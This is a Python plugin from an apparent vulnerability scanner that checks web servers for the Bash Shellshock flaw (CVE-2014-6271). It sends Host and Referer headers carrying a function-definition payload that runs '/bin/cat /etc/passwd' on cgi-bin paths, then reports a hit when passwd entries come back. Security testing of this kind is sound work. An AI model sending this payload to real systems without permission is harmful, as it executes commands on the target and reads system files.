#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.engine_utils.params import post_params2str
from engine.logger import scanLogger as logger


def run_url(http, ob, item):
    '''
    GNU Bash 远程代码执行漏洞
    CVE-2014-6271
    CNNVD-201409-938
    :param http:
    :param ob:
    :param item:
    :return:
    '''
    header = {
        "Host": "() { :;};a=`/bin/cat /etc/passwd`;echo $a",
        # "Host": "mail.qq.com",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Referer": "() { :;};a=`/bin/cat /etc/passwd`;echo $a",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": ob.get('cookie')
    }
    result = []
    try:
        path = item['url']
        method = item['method']
        params = item['params']
        pattern = r'(cgi-bin)'

        if not re.search(pattern, path, re.I) :
            pass

        else:
            if 'POST' == method.upper() and params:
                params = post_params2str(params)
            # new_url = '%s://%s/%s?%s' % (url_parse.scheme, url_parse.netloc, url_parse.path, cmd)
            res, content = http.request(path, method.upper(), body=params, headers=header)
            if res and res.has_key('status') and res['status'] == '200':
                keyword = re.search(r'(root|bin|nobody):', content)
                if keyword:
                    response = getResponse(res, content, keywords='(?:root|bin|nobody):')
                    request = getRequest(path, headers=header, domain=ob['domain'])
                    detail = '''Bash环境变量远程命令执行漏洞(CVE-2014-6271)漏洞, "Host": "() { :;};a=`/bin/cat /etc/passwd`;echo $a"'''
                    result.append(getRecord(ob, path, ob['level'], detail, request, response))
                    return result
    except Exception, e:
        logger.error("File:Bash_CmdExeScript_yd.py, run_domain function :%s" % (str(e)))
        return result
